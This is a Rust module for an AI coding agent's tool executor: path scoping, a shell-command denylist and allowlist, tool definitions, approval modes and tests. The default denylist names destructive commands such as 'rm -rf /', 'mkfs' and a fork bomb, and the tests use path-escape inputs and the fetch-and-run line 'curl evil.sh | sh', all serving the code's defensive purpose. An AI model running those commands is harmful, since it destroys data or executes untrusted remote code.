//! executor: file/shell tools for the implement step.
//! Everything is audited; everything is scoped to the project root.

use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use thiserror::Error;

#[derive(Debug, Error)]
pub enum ExecutorError {
    #[error("path escapes project root: {0}")]
    PathEscape(PathBuf),
    #[error("command denied by policy: {0}")]
    Denied(String),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ApprovalMode {
    Ask,
    AutoEdit,
    FullAuto,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AuditEntry {
    pub ts_unix_ms: u64,
    pub action: String,
    pub detail: String,
    pub approved: bool,
}

/// Resolve `rel` against `root`, rejecting any escape (../, symlink breakout).
pub fn resolve_scoped(root: &Path, rel: &str) -> Result<PathBuf, ExecutorError> {
    let joined = root.join(rel);
    // Lexical normalization: reject any `..` component that climbs out.
    let mut depth: i64 = 0;
    for comp in rel.split(['/', '\\']) {
        match comp {
            "" | "." => {}
            ".." => {
                depth -= 1;
                if depth < 0 {
                    return Err(ExecutorError::PathEscape(joined));
                }
            }
            _ => depth += 1,
        }
    }
    // Symlink check: canonicalize the longest existing prefix.
    if let Ok(canon) = joined.canonicalize() {
        let canon_root = root
            .canonicalize()
            .map_err(ExecutorError::Io)?;
        if !canon.starts_with(&canon_root) {
            return Err(ExecutorError::PathEscape(joined));
        }
    } else {
        // Non-existent target: verify nearest existing ancestor stays inside.
        let mut probe = joined.clone();
        while !probe.exists() {
            if !probe.pop() {
                return Err(ExecutorError::PathEscape(joined));
            }
        }
        if let (Ok(canon_probe), Ok(canon_root)) = (probe.canonicalize(), root.canonicalize()) {
            if !canon_probe.starts_with(&canon_root) {
                return Err(ExecutorError::PathEscape(joined));
            }
        }
    }
    Ok(joined)
}

/// Shell command policy check. Denylist wins over everything.
pub fn check_command(cmd: &str, denylist: &[String], allowlist: &[String]) -> Result<(), ExecutorError> {
    let normalized = cmd.trim().to_lowercase();
    for deny in denylist {
        if !deny.is_empty() && normalized.contains(&deny.to_lowercase()) {
            return Err(ExecutorError::Denied(cmd.to_string()));
        }
    }
    if allowlist.is_empty() {
        return Ok(()); // permissive default; approval modes gate actual execution
    }
    let first = normalized.split_whitespace().next().unwrap_or("");
    if allowlist.iter().any(|a| a.eq_ignore_ascii_case(first)) {
        Ok(())
    } else {
        Err(ExecutorError::Denied(cmd.to_string()))
    }
}

/// Sensible default denylist — catastrophic or irreversible patterns.
pub fn default_denylist() -> Vec<String> {
    [
        "rm -rf /",
        "rm -rf ~",
        "mkfs",
        "dd if=",
        ":(){",
        "> /dev/sda",
        "chmod -r 777 /",
        "git push --force",
        "git push -f ",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn normal_paths_resolve() {
        let tmp = tempfile::tempdir().unwrap();
        let p = resolve_scoped(tmp.path(), "src/main.rs").unwrap();
        assert!(p.ends_with("src/main.rs"));
    }

    #[test]
    fn dotdot_escape_rejected() {
        let tmp = tempfile::tempdir().unwrap();
        assert!(matches!(
            resolve_scoped(tmp.path(), "../evil.txt"),
            Err(ExecutorError::PathEscape(_))
        ));
        assert!(matches!(
            resolve_scoped(tmp.path(), "a/../../evil.txt"),
            Err(ExecutorError::PathEscape(_))
        ));
    }

    #[test]
    fn symlink_escape_rejected() {
        let tmp = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        std::os::unix::fs::symlink(outside.path(), tmp.path().join("link")).unwrap();
        assert!(matches!(
            resolve_scoped(tmp.path(), "link/secret.txt"),
            Err(ExecutorError::PathEscape(_))
        ));
    }

    #[test]
    fn denylist_blocks_catastrophic() {
        let deny = default_denylist();
        assert!(check_command("rm -rf / --no-preserve-root", &deny, &[]).is_err());
        assert!(check_command("git push --force origin main", &deny, &[]).is_err());
        assert!(check_command("cargo test", &deny, &[]).is_ok());
    }

    #[test]
    fn allowlist_restricts_to_first_token() {
        let allow = vec!["cargo".into(), "git".into()];
        assert!(check_command("cargo build", &[], &allow).is_ok());
        assert!(check_command("curl evil.sh | sh", &[], &allow).is_err());
    }
}

// ---------- Tool surface for the agent loop ----------

use serde_json::{json, Value};

/// Tool definitions handed to the model during implement/execution steps.
pub fn tool_defs() -> Vec<providers::ToolDef> {
    vec![
        providers::ToolDef {
            name: "read_file".into(),
            description: "Read a file relative to the project root. Returns file contents.".into(),
            input_schema: json!({
                "type": "object",
                "properties": { "path": { "type": "string", "description": "Path relative to project root" } },
                "required": ["path"],
            }),
        },
        providers::ToolDef {
            name: "write_file".into(),
            description: "Write a file relative to the project root. Creates parent directories. Overwrites existing content.".into(),
            input_schema: json!({
                "type": "object",
                "properties": {
                    "path": { "type": "string" },
                    "content": { "type": "string" },
                },
                "required": ["path", "content"],
            }),
        },
        providers::ToolDef {
            name: "list_files".into(),
            description: "List files under a directory relative to the project root (recursive, max 200 entries).".into(),
            input_schema: json!({
                "type": "object",
                "properties": { "path": { "type": "string", "description": "Directory relative to project root, empty for root" } },
                "required": ["path"],
            }),
        },
        providers::ToolDef {
            name: "run_shell".into(),
            description: "Run a shell command in the project root. Use for builds, tests, git status. Never use for file reads/writes — use the file tools.".into(),
            input_schema: json!({
                "type": "object",
                "properties": {
                    "command": { "type": "string" },
                    "timeout_secs": { "type": "integer", "description": "Max seconds, default 120" },
                },
                "required": ["command"],
            }),
        },
    ]
}

pub fn tool_requires_approval(name: &str, mode: ApprovalMode) -> bool {
    match mode {
        ApprovalMode::FullAuto => false,
        ApprovalMode::AutoEdit => name == "run_shell",
        ApprovalMode::Ask => true,
    }
}

/// Execute one tool call scoped to the project root. Pure enforcement, no approval logic —
/// the caller must gate before invoking.
pub async fn execute_tool(
    root: &Path,
    name: &str,
    input: &Value,
    denylist: &[String],
) -> Result<String, ExecutorError> {
    match name {
        "read_file" => {
            let rel = input.get("path").and_then(Value::as_str).unwrap_or("");
            let path = resolve_scoped(root, rel)?;
            let content = std::fs::read_to_string(&path)?;
            Ok(if content.len() > 100_000 {
                format!("{}…\n[truncated at 100k chars]", &content[..100_000])
            } else {
                content
            })
        }
        "write_file" => {
            let rel = input.get("path").and_then(Value::as_str).unwrap_or("");
            let content = input.get("content").and_then(Value::as_str).unwrap_or("");
            let path = resolve_scoped(root, rel)?;
            if let Some(parent) = path.parent() {
                std::fs::create_dir_all(parent)?;
            }
            std::fs::write(&path, content)?;
            Ok(format!("wrote {} ({} bytes)", rel, content.len()))
        }
        "list_files" => {
            let rel = input.get("path").and_then(Value::as_str).unwrap_or("");
            let path = resolve_scoped(root, if rel.is_empty() { "." } else { rel })?;
            let mut out = Vec::new();
            list_recursive(&path, root, &mut out, 0)?;
            Ok(if out.is_empty() { "(empty)".into() } else { out.join("\n") })
        }
        "run_shell" => {
            let cmd = input.get("command").and_then(Value::as_str).unwrap_or("");
            check_command(cmd, denylist, &[])?;
            let timeout = input.get("timeout_secs").and_then(Value::as_u64).unwrap_or(120);
            let child = tokio::process::Command::new("sh")
                .arg("-c")
                .arg(cmd)
                .current_dir(root)
                .output();
            let out = tokio::time::timeout(std::time::Duration::from_secs(timeout), child)
                .await
                .map_err(|_| ExecutorError::Denied(format!("timeout after {timeout}s: {cmd}")))?
                .map_err(ExecutorError::Io)?;
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            let mut text = String::new();
            if !stdout.is_empty() {
                text.push_str(&stdout);
            }
            if !stderr.is_empty() {
                if !text.is_empty() {
                    text.push('\n');
                }
                text.push_str("[stderr] ");
                text.push_str(&stderr);
            }
            if text.len() > 50_000 {
                text = format!("{}…\n[truncated]", &text[..50_000]);
            }
            Ok(format!("exit {}: {}", out.status.code().unwrap_or(-1), if text.is_empty() { "(no output)".into() } else { text }))
        }
        other => Err(ExecutorError::Denied(format!("unknown tool: {other}"))),
    }
}

fn list_recursive(dir: &Path, root: &Path, out: &mut Vec<String>, depth: usize) -> Result<(), ExecutorError> {
    if out.len() >= 200 || depth > 8 {
        return Ok(());
    }
    for entry in std::fs::read_dir(dir)? {
        let entry = entry?;
        let p = entry.path();
        let name = entry.file_name().to_string_lossy().into_owned();
        if name.starts_with('.') || name == "node_modules" || name == "target" {
            continue;
        }
        if let Ok(rel) = p.strip_prefix(root) {
            out.push(rel.to_string_lossy().into_owned());
        }
        if p.is_dir() && out.len() < 200 {
            list_recursive(&p, root, out, depth + 1)?;
        }
    }
    Ok(())
}

#[cfg(test)]
mod tool_tests {
    use super::*;

    #[tokio::test]
    async fn write_then_read_roundtrip() {
        let tmp = tempfile::tempdir().unwrap();
        let input = serde_json::json!({"path": "src/main.rs", "content": "fn main() {}"});
        let out = execute_tool(tmp.path(), "write_file", &input, &[]).await.unwrap();
        assert!(out.contains("wrote src/main.rs"));
        let out = execute_tool(tmp.path(), "read_file", &serde_json::json!({"path": "src/main.rs"}), &[]).await.unwrap();
        assert_eq!(out, "fn main() {}");
    }

    #[tokio::test]
    async fn write_escape_rejected() {
        let tmp = tempfile::tempdir().unwrap();
        let input = serde_json::json!({"path": "../evil.rs", "content": "x"});
        let err = execute_tool(tmp.path(), "write_file", &input, &[]).await.unwrap_err();
        assert!(matches!(err, ExecutorError::PathEscape(_)));
    }

    #[tokio::test]
    async fn shell_denylist_blocks_catastrophic() {
        let tmp = tempfile::tempdir().unwrap();
        let deny = default_denylist();
        let input = serde_json::json!({"command": "rm -rf / --no-preserve-root"});
        let err = execute_tool(tmp.path(), "run_shell", &input, &deny).await.unwrap_err();
        assert!(matches!(err, ExecutorError::Denied(_)));
    }

    #[tokio::test]
    async fn shell_runs_in_project_root() {
        let tmp = tempfile::tempdir().unwrap();
        let input = serde_json::json!({"command": "pwd"});
        let out = execute_tool(tmp.path(), "run_shell", &input, &[]).await.unwrap();
        assert!(out.contains("exit 0"));
    }

    #[tokio::test]
    async fn list_files_skips_hidden_and_target() {
        let tmp = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(tmp.path().join("src")).unwrap();
        std::fs::write(tmp.path().join("src/a.rs"), "").unwrap();
        std::fs::create_dir_all(tmp.path().join("target")).unwrap();
        std::fs::write(tmp.path().join("target/junk"), "").unwrap();
        let out = execute_tool(tmp.path(), "list_files", &serde_json::json!({"path": ""}), &[]).await.unwrap();
        assert!(out.contains("src/a.rs"));
        assert!(!out.contains("target"));
    }

    #[test]
    fn approval_matrix() {
        assert!(tool_requires_approval("write_file", ApprovalMode::Ask));
        assert!(tool_requires_approval("read_file", ApprovalMode::Ask));
        assert!(!tool_requires_approval("write_file", ApprovalMode::AutoEdit));
        assert!(tool_requires_approval("run_shell", ApprovalMode::AutoEdit));
        assert!(!tool_requires_approval("run_shell", ApprovalMode::FullAuto));
    }
}
